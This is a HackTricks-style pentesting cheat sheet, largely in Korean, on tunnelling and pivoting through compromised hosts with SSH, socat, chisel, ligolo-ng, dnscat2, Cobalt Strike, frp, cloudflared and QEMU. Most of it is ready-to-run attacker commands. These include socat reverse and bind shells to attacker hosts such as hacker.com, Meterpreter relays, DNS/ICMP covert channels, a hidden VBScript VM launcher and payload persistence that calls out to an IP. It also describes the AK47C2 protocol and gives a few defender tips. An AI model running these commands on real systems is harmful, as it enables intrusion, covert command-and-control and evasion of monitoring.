# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap 팁

> [!WARNING]
> **ICMP** and **SYN** scans cannot be tunnelled through socks proxies, so we must **disable ping discovery** (`-Pn`) and specify **TCP scans** (`-sT`) for this to work.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH 그래픽 연결 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Server에서 새 Port 열기 --> 다른 Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

로컬 포트 --> 침해된 호스트 (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

로컬 포트 --> 침해된 호스트 (SSH) --> 어디로든
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

이것은 내부 호스트에서 DMZ를 통해 당신의 호스트로 reverse shells를 얻는 데 유용합니다:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

두 장치 모두에 **root** 권한이 필요합니다 (새로운 인터페이스를 생성할 것이기 때문에) 그리고 sshd 설정에서 root 로그인을 허용해야 합니다:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Server 측에서 forwarding을 활성화하세요
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
클라이언트 측에서 새 라우트를 설정합니다.
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **보안 – Terrapin Attack (CVE-2023-48795)**
> 2023 Terrapin downgrade 공격은 man-in-the-middle이 초기 SSH handshake를 변조하고 **any forwarded channel** (`-L`, `-R`, `-D`)에 데이터를 주입할 수 있게 합니다. SSH tunnels에 의존하기 전에 클라이언트와 서버가 모두 패치되어 있는지(**OpenSSH ≥ 9.6/LibreSSH 6.7**) 확인하거나 `sshd_config`/`ssh_config`에서 취약한 `chacha20-poly1305@openssh.com` 및 `*-etm@openssh.com` 알고리즘을 명시적으로 비활성화하세요.

## SSHUTTLE

호스트를 통해 **tunnel** via **ssh**로 **traffic**을 **subnetwork**로 전달할 수 있습니다.\
예: 10.10.10.0/24로 향하는 모든 traffic을 포워딩하는 경우
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
개인 키로 연결
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
또 다른 방법:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

teamserver에서 모든 인터페이스에서 수신하도록 포트를 열어, 트래픽을 **beacon을 통해 라우팅**하는 데 사용할 수 있다.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> 이 경우, **port는 beacon host에서 열립니다**, Team Server가 아니라 traffic은 Team Server로 전송된 뒤 거기에서 지정된 host:port로 전달됩니다.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
참고:

- Beacon의 reverse port forward는 **트래픽을 Team Server로 터널링하도록 설계되어 있으며, 개별 머신 간의 중계용이 아닙니다**.
- 트래픽은 **Beacon의 C2 트래픽 내에서 터널링**되며, P2P 링크도 포함됩니다.
- **Admin privileges는 고포트에서 reverse port forwards를 생성하는 데 필요하지 않습니다**.

### rPort2Port local

> [!WARNING]
> 이 경우, **포트는 beacon host에서 열리며**, Team Server에서 열린 것이 아니고, **트래픽은 Cobalt Strike client로 전송됩니다** (Team Server로 전송되지 않고) 거기서 지정된 host:port로 전달됩니다.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

업로드해야 하는 웹 파일 터널: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

이것은 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\의 releases 페이지에서 다운로드할 수 있습니다  
**클라이언트와 서버에 동일한 버전을 사용해야 합니다**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**agent와 proxy에는 동일한 버전을 사용하세요**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent 바인딩 및 리스닝
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### 에이전트의 로컬 포트에 접근
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. 터널은 victim에서 시작됩니다.\
127.0.0.1:1080에 socks4 proxy가 생성됩니다.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy**를 통한 Pivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks를 통한 Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat을 통한 Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
피해자의 콘솔에서 마지막 줄 대신 이 줄을 실행하면 **인증되지 않은 프록시**를 우회할 수 있습니다:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

양쪽(클라이언트와 서버)에 인증서를 생성합니다
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

로컬 SSH 포트(22)를 attacker host의 443 포트에 연결합니다
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

콘솔용 PuTTY 버전과 비슷합니다(옵션이 ssh 클라이언트와 매우 유사합니다).

이 바이너리는 피해자 시스템에서 실행되며 ssh 클라이언트이므로, reverse connection을 수립하기 위해 우리 쪽에서 ssh 서비스와 포트를 열어야 합니다. 그런 다음, 로컬에서만 접근 가능한 포트를 우리 머신의 포트로 포워딩하려면:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

local admin 권한이 필요합니다 (모든 port에 대해)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

대상 시스템에 **RDP access**가 있어야 합니다.\
다운로드:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 Remote Desktop Service 기능에 있는 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 **tunneling packets over the RDP connection**을 담당합니다.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

클라이언트 컴퓨터에서 **`SocksOverRDP-Plugin.dll`**을 다음과 같이 로드하세요:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
이제 우리는 **connect**를 사용해 **victim**에 **RDP**로 **`mstsc.exe`**로 접속할 수 있으며, **SocksOverRDP plugin is enabled**라는 **prompt**가 표시되고 **127.0.0.1:1080**에서 **listen**할 것입니다.

**Connect** via **RDP**하고 **victim** 머신에 `SocksOverRDP-Server.exe` 바이너리를 업로드하고 실행하세요:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
이제 공격자 머신 (attacker)에서 포트 1080이 listening 중인지 확인하세요:
```
netstat -antb | findstr 1080
```
이제 [**Proxifier**](https://www.proxifier.com/) **를 사용해 해당 포트를 통해 트래픽을 프록시할 수 있습니다.**

## Windows GUI 앱을 Proxify하기

[**Proxifier**](https://www.proxifier.com/)를 사용하면 Windows GUI 앱의 트래픽을 프록시를 통해 이동시키도록 설정할 수 있습니다.\
**Profile -> Proxy Servers**에서 SOCKS server의 IP와 포트를 추가합니다.\
**Profile -> Proxification Rules**에서 proxify할 프로그램 이름과 proxify하려는 대상 IP로의 연결을 추가합니다.

## NTLM proxy bypass

위에서 언급한 도구: **Rpivot**\
**OpenVPN**은 또한 이를 우회할 수 있으며, 설정 파일에 다음 옵션을 설정하면 됩니다:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

프록시에 인증하고, 지정한 외부 서비스로 포워딩되는 로컬 port를 바인딩합니다. 그런 다음, 이 port를 통해 원하는 도구를 사용할 수 있습니다.\
예: port 443을 포워딩하는 경우
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
이제 예를 들어 피해자 시스템에서 **SSH** 서비스를 포트 443으로 리스닝하도록 설정하면 공격자는 포트 2222를 통해 해당 서비스에 연결할 수 있다. 또한 **meterpreter**가 localhost:443에 연결하고 공격자가 포트 2222에서 리스닝하도록 설정할 수도 있다.

## YARP

Microsoft가 만든 reverse proxy다. 여기에서 확인할 수 있다: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

두 시스템 모두에서 tun adapters를 생성하고 DNS 쿼리를 사용해 데이터를 터널링하려면 root 권한이 필요하다.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
터널은 매우 느릴 것입니다. 다음을 사용하여 이 터널을 통해 압축된 SSH 연결을 생성할 수 있습니다:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

DNS를 통해 C\&C 채널을 생성합니다. root privileges가 필요하지 않습니다.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell에서**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)을 사용하면 powershell에서 dnscat2 client를 실행할 수 있습니다:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat를 이용한 포트 포워딩**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS 변경

Proxychains는 `gethostbyname` libc 호출을 가로채 socks 프록시를 통해 tcp DNS 요청을 터널링합니다. 기본적으로 proxychains가 사용하는 **DNS** 서버는 하드코딩된 **4.2.2.2**입니다. 변경하려면 파일 _/usr/lib/proxychains3/proxyresolv_ 을 편집해 IP를 바꾸세요. **Windows environment**라면 **domain controller**의 IP를 설정할 수 있습니다.

## Go에서의 터널링

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

The Storm-2603 actor created a **dual-channel C2 ("AK47C2")** that abuses *only* outbound **DNS** and **plain HTTP POST** traffic – two protocols that are rarely blocked on corporate networks.

1. **DNS mode (AK47DNS)**
• 무작위 5자 SessionID(예: `H4T14`)를 생성합니다.
• *task requests*는 `1`을, *results*는 `2`를 앞에 붙이고 여러 필드(flags, SessionID, computer name)를 연결합니다.
• 각 필드는 **ASCII 키 `VHBD@H`로 XOR-encrypted**되고, hex-encoded 되어 점으로 이어지며 — 마지막에 공격자 관리 도메인으로 끝납니다:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests는 **TXT** (대체로 **MG**) 레코드에 대해 `DnsQuery()`를 사용합니다.
• 응답이 0xFF 바이트를 초과하면 백도어는 데이터를 63바이트 조각으로 **fragments**하고 마커 `s<SessionID>t<TOTAL>p<POS>`를 삽입하여 C2 서버가 재정렬할 수 있게 합니다.

2. **HTTP mode (AK47HTTP)**
• JSON envelope를 구성합니다:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• 전체 블롭은 XOR-`VHBD@H` → hex → 인코딩되어 `Content-Type: text/plain` 헤더를 가진 **`POST /`** 바디로 전송됩니다.
• 응답도 동일한 인코딩을 사용하며 `cmd` 필드는 `cmd.exe /c <command> 2>&1`로 실행됩니다.

Blue Team 노트
• 첫 레이블이 긴 16진수이고 항상 하나의 희귀 도메인으로 끝나는 비정상적인 **TXT 쿼리**를 찾아보세요.
• 일정한 XOR 키 뒤에 ASCII-hex가 오는 패턴은 YARA로 쉽게 탐지할 수 있습니다: `6?56484244?484` (`VHBD@H` in hex).
• HTTP의 경우 순수 hex이고 두 바이트 배수인 text/plain POST 바디를 표시하세요.

{{#note}}
전체 채널은 **standard RFC-compliant queries**에 들어가며 각 서브도메인 레이블을 63바이트 이하로 유지해 대부분의 DNS 로그에서 은밀합니다.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

두 시스템 모두 tun adapters를 생성하고 ICMP echo requests를 사용해 그 사이에 데이터를 터널링하려면 root 권한이 필요합니다.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**여기에서 다운로드하세요**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **한 줄 명령으로 서비스를 인터넷에 노출하는 도구입니다.**\
_노출되는 URI는 다음과 같습니다:_ **UID.ngrok.io**

### 설치

- 계정 생성: https://ngrok.com/signup
- 클라이언트 다운로드:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 기본 사용법

**문서:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_필요한 경우 인증과 TLS를 추가할 수도 있습니다._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP로 파일 노출
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP 호출

_XSS,SSRF,SSTI 등에 유용..._\  
stdout에서 직접 또는 HTTP 인터페이스([http://127.0.0.1:4040](http://127.0.0.1:4000))에서 확인 가능.

#### Tunneling 내부 HTTP 서비스
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 간단한 구성 예시

3개의 터널을 엽니다:

- 2개의 TCP
- 1개의 HTTP — /tmp/httpbin/에서 정적 파일을 노출
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare의 `cloudflared` 데몬은 Cloudflare의 엣지를 중계 지점으로 사용하여 인바운드 방화벽 규칙 없이도 **로컬 TCP/UDP 서비스**를 노출하는 아웃바운드 터널을 생성할 수 있습니다. 이는 이그레스(egress) 방화벽이 HTTPS 트래픽만 허용하고 인바운드 연결이 차단된 경우 매우 유용합니다.

### 간단한 터널 원라이너
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNS를 이용한 지속적인 터널
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
커넥터를 시작하세요:
```bash
cloudflared tunnel run mytunnel
```
Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) is an actively-maintained Go reverse-proxy that supports **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. Starting with **v0.53.0 (May 2024)** it can act as an **SSH Tunnel Gateway**, so a target host can spin up a reverse tunnel using only the stock OpenSSH client – no extra binary required.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 새로운 SSH 게이트웨이 사용하기 (frpc 바이너리 불필요)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
위 명령은 추가 툴을 배치하지 않고도 피해자 포트 **8080**을 **attacker_ip:9000**으로 공개합니다 — living-off-the-land pivoting에 이상적입니다.

## QEMU를 이용한 은밀한 VM 기반 터널

QEMU의 user-mode networking (`-netdev user`)은 `hostfwd`라는 옵션을 지원하는데, 이 옵션은 **호스트(*host*)의 TCP/UDP 포트를 바인딩하여 게스트(*guest*)로 포워딩합니다**. 게스트에 정식 SSH daemon이 실행되면, hostfwd 규칙은 일회성 SSH jump box를 제공하며 이는 완전히 임시 VM 내부에 존재합니다 — 모든 악성 활동과 파일이 가상 디스크에 머무르므로 EDR로부터 C2 트래픽을 숨기기에 완벽합니다.

### 빠른 한 줄 명령
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 위 명령은 **Tiny Core Linux** 이미지 (`tc.qcow2`)를 RAM에서 실행합니다.  
• Windows 호스트의 포트 **2222/tcp**가 게스트 내부의 **22/tcp**로 투명하게 포워딩됩니다.  
• 공격자 관점에서 대상은 단순히 포트 2222만 노출하며; 해당 포트에 도달하는 모든 패킷은 VM에서 실행 중인 SSH 서버가 처리합니다.

### VBScript로 은밀히 실행하기
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
스크립트를 `cscript.exe //B update.vbs`로 실행하면 창이 숨겨진다.

### In-guest persistence

Because Tiny Core is stateless, attackers usually:

1. payload를 `/opt/123.out`에 둔다
2. `/opt/bootlocal.sh`에 다음을 추가:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `/opt/filetool.lst`에 `home/tc`와 `opt`를 추가하여 shutdown 시 payload가 `mydata.tgz`에 묶이도록 한다.

### Why this evades detection

• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).  
• Memory scanners never analyse the malicious process space because it lives in a different OS.

### Defender tips

• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
• Block outbound connections that originate from `qemu-system*.exe`.  
• Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
